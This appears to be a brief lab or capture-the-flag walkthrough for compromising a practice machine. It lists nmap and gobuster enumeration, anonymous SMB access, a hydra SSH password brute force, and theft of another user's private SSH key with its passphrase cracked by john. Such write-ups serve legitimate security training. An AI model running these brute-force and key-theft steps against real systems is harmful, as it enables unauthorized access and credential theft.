Steps
1- nmap -Pn <target_ip>
2- gobuster dir -u http://<target_ip>/ -w /usr/share/wordlists/dirb/common.txt -x php
3- smbclient -L //<target_ip>/ -N
4- sudo mount.cifs //<target_ip>/Anonymous ~/Desktop/mount -o vers=3.0,guest
5- cat ~/Desktop/mount/staff.txt --> (found users Jan & Kay)
6- hydra -l Jan -P rockyou.txt ssh://<traget_ip>  -->(password of Jan is: armando )
7- ssh Jan@<target_ip> --> then enter the password (Now we are in the machine)
8- Go to another user kay and see the files and directories in its folder --> (find .ssh folder)
9- Enter .ssh folder and found a private key file we can take its content and put it in a file on my device name rsa_id
10- convert the key file to hash by using ssh2john tool, command: ssh2john rsa_id > rsa_id_hash
11- Try to get the password of the another user (kay) from the hash file, command: john rsa_id_hash --wordlist=/home/kali/Desktop/rockyou.txt --> found pass:beeswax
12- we don't have the real password we have the password that depend on the rsa key so
 we can change mode of the key file to run it with the login, command: chmod 600 rsa_id
13- Login the machine: ssh kay@10.82.166.138 -i rsa_id
 Now we have the permetion to open the file in kay folder (pass.bak) and its contain the password
